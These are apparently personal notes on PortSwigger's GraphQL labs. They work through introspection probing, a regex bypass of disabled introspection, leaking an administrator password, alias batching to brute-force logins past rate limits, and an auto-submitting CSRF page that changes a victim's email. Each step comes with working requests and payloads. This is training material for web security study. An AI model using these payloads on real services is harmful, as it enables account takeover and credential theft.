---
title: PortSwigger - GraphQL
date: '2024-03-10'
tags: ['PortSwigger', 'PortSwigger Labs', 'Web Security']
draft: false
summary: 
---

## GraphQL Notes
GraphQL has :
- Queries : To retrieve data (like `GET` method on REST)

```
query myGetProductQuery{
	getProduct(id: 123){
		name
		description
	}
}
```

- Mutations : To make changes to that data (equivalent to `POST`, `PUT` , `DELETE` in REST api)

```
#Example mutation request

mutation {
	createProduct(name: "Flamin Cocktail Glasses", listed:"yes"){
		id
		name
		listed
	}
}
```


```
# Example mutation response

{
	"data" : {
		"createProduct": {
			"id": 123,
			"name": "Flamin Cocktail Glasses",
			"listed": "yes"
		}
	}
}
```

---
### Labs
#### Accessing private GraphQL posts
First we try and do an introspection query to understand the schema
Send graphql endpoint to repeater and make sure body is empty, then add graphql syntax to the graphql section in repeater.


```
# trying universal query to confirm its graphql service

{
"query":"{__typename}"
}


# introspection probe request to confirm if introspection exists
# just copy paste the below in graphql tab in repeater, it will adjust json

{__schema{queryType{name}}}

# to get root query fields:

{
  __schema {
    queryType {
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
    }
  }
}


# run full introspection query present at 
https://portswigger.net/web-security/graphql

```

```
# Solution
query getBlogPost ($id:Int!) {
    getBlogPost (id:$id) {
        image
        title
        author
        id
        paragraphs
        postPassword
    }
}

Variables:
{"id":3}
```

#### Accidental exposure of private GraphQL fields
Used the query mentioned above to return root fields. This was the request and response :

```
# request 
{
  __schema {
    queryType {
      fields {
        name
        type {
          name
          kind
          ofType {
            name
            kind
          }
        }
      }
    }
  }
}


# response 

HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 740

{
  "data": {
    "__schema": {
      "queryType": {
        "fields": [
          {
            "name": "getBlogPost",
            "type": {
              "name": "BlogPost",
              "kind": "OBJECT",
              "ofType": null
            }
          },
          {
            "name": "getAllBlogPosts",
            "type": {
              "name": null,
              "kind": "NON_NULL",
              "ofType": {
                "name": null,
                "kind": "LIST"
              }
            }
          },
          {
            "name": "getUser",
            "type": {
              "name": "User",
              "kind": "OBJECT",
              "ofType": null
            }
          }
        ]
      }
    }
  }
}
```


Final query:

```
query {
  getUser (id:1) {
    id
    username
    password
  }
}

response :
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 133

{
  "data": {
    "getUser": {
      "id": 1,
      "username": "administrator",
      "password": "5sx5ykv9m970932638ew"
    }
  }
}

```


#### Finding a hidden GraphQL endpoint

> When introspection query is disabled, it is usually done by blocking `__schema` keyword using regex. We can try adding spaces, commas to test for a bypass.


As such, if the developer has only excluded `__schema{`, then the below introspection query would not be excluded.

```
#Introspection query with newline
{ "query": "query{__schema {queryType{name}}}" }`
```

It could also be possible that introspection is only disabled on `POST`, we can try other methods.

```
# Introspection probe as GET request 

GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D
```


 
We found out that `/api` is the hidden endpoint by send a get request to it and getting the following response

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
Set-Cookie: session=KY983HoSE2sAwqylZWysXQOPI5pABQ15; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 19

"Query not present"
```

```
https://0a6d00d2049bd7b08406b8a900b90087.web-security-academy.net/api?query=query{__typename}


# introspection query in get request blocked
`/api?query=query+IntrospectionQuery+%7B%0A++__schema+%7B%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A`


# bypass regex
`/api?query=query+IntrospectionQuery+%7B%0D%0A++__schema%0a+%7B%0D%0A++++queryType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++mutationType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++subscriptionType+%7B%0D%0A++++++name%0D%0A++++%7D%0D%0A++++types+%7B%0D%0A++++++...FullType%0D%0A++++%7D%0D%0A++++directives+%7B%0D%0A++++++name%0D%0A++++++description%0D%0A++++++args+%7B%0D%0A++++++++...InputValue%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+FullType+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++description%0D%0A++fields%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++args+%7B%0D%0A++++++...InputValue%0D%0A++++%7D%0D%0A++++type+%7B%0D%0A++++++...TypeRef%0D%0A++++%7D%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++inputFields+%7B%0D%0A++++...InputValue%0D%0A++%7D%0D%0A++interfaces+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++enumValues%28includeDeprecated%3A+true%29+%7B%0D%0A++++name%0D%0A++++description%0D%0A++++isDeprecated%0D%0A++++deprecationReason%0D%0A++%7D%0D%0A++possibleTypes+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A%7D%0D%0A%0D%0Afragment+InputValue+on+__InputValue+%7B%0D%0A++name%0D%0A++description%0D%0A++type+%7B%0D%0A++++...TypeRef%0D%0A++%7D%0D%0A++defaultValue%0D%0A%7D%0D%0A%0D%0Afragment+TypeRef+on+__Type+%7B%0D%0A++kind%0D%0A++name%0D%0A++ofType+%7B%0D%0A++++kind%0D%0A++++name%0D%0A++++ofType+%7B%0D%0A++++++kind%0D%0A++++++name%0D%0A++++++ofType+%7B%0D%0A++++++++kind%0D%0A++++++++name%0D%0A++++++%7D%0D%0A++++%7D%0D%0A++%7D%0D%0A%7D%0D%0A`


# deleting carlos using mutation 

https://0a6d00d2049bd7b08406b8a900b90087.web-security-academy.net/api?query=mutation+%7B%0A%09deleteOrganizationUser%28input%3A%7Bid%3A+3%7D%29+%7B%0A%09%09user+%7B%0A%09%09%09id%0A%09%09%7D%0A%09%7D%0A%7D
```

#### Bypassing GraphQL brute force protections
GraphQL properties cannot be with same name, to overcome this we use alias. Aliases were designed to limit number of API request calls, but we can use this feature to bypass ratelimiting.

Some rate limiters work based on the number of HTTP requests received rather than the number of operations performed on the endpoint. Because aliases effectively enable you to send multiple queries in a single HTTP message, they can bypass this restriction.

Here is the login request query to login to user carlos:

```
    mutation login($input: LoginInput!) {
        login(input: $input) {
            token
            success
        }
    }

Variables:
{
"input":
	{
	"username": "carlose",
	"password":"test"
	}
}
```

Our goal is to brute force the password to this user but ratelimiting is implemented, to bypass this limit we will use aliases.

```
mutation login{
bruteforce0:login(input:{password: "123456", username: "carlos"}) {
        token
        success
    }


bruteforce1:login(input:{password: "password", username: "carlos"}) {
        token
        success
    }


bruteforce2:login(input:{password: "12345678", username: "carlos"}) {
        token
        success
    }
}
```


#### Performing CSRF exploits over GraphQL
GraphQL can be used as a vector for CSRF attacks, whereby an attacker creates an exploit that causes a victim's browser to send a malicious query as the victim user.

here is the action email change request:
```http
POST /graphql/v1 HTTP/2
Host: 0a6600f803cc4f11817bf7ab00470033.web-security-academy.net
Cookie: session=jyCOhsWjUXLTOb3duN0YcXHuvD04sdIx; session=jyCOhsWjUXLTOb3duN0YcXHuvD04sdIx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6600f803cc4f11817bf7ab00470033.web-security-academy.net/my-account
Content-Type: application/x-www-form-urlencoded
Content-Length: 231
Origin: https://0a6600f803cc4f11817bf7ab00470033.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

{"query":"\n    mutation changeEmail($input: ChangeEmailInput!) {\n        changeEmail(input: $input) {\n            email\n        }\n    }\n","operationName":"changeEmail","variables":{"input":{"email":"kitij98496@acentni.com"}}}
```


We change it to :

```http
POST /graphql/v1 HTTP/2
Host: 0a6600f803cc4f11817bf7ab00470033.web-security-academy.net
Cookie: session=jyCOhsWjUXLTOb3duN0YcXHuvD04sdIx; session=jyCOhsWjUXLTOb3duN0YcXHuvD04sdIx
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a6600f803cc4f11817bf7ab00470033.web-security-academy.net/my-account
Content-Type: application/x-www-form-urlencoded
Content-Length: 276
Origin: https://0a6600f803cc4f11817bf7ab00470033.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

    query=%0A++++mutation+changeEmail%28%24input%3A+ChangeEmailInput%21%29+%7B%0A++++++++changeEmail%28input%3A+%24input%29+%7B%0A++++++++++++email%0A++++++++%7D%0A++++%7D%0A&operationName=changeEmail&variables=%7B%22input%22%3A%7B%22email%22%3A%22hacker%40hacker.com%22%7D%7D
```


csrf POC will be :


```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF PoC</title>
</head>
<body>
    <h1>CSRF PoC</h1>
    <form id="csrf-form" method="POST" action="https://0a6600f803cc4f11817bf7ab00470033.web-security-academy.net/graphql/v1">
        <input type="hidden" name="query" value="mutation changeEmail($input: ChangeEmailInput!) { changeEmail(input: $input) { email } }" />
        <input type="hidden" name="operationName" value="changeEmail" />
        <input type="hidden" name="variables" value="{&quot;input&quot;:{&quot;email&quot;:&quot;hacker@hacker.com&quot;}}" />
        <button type="submit">Change Email</button>
    </form>

    <script>
        // Automatically submit the form to perform the CSRF attack
        document.getElementById('csrf-form').submit();
    </script>
</body>
</html>
```


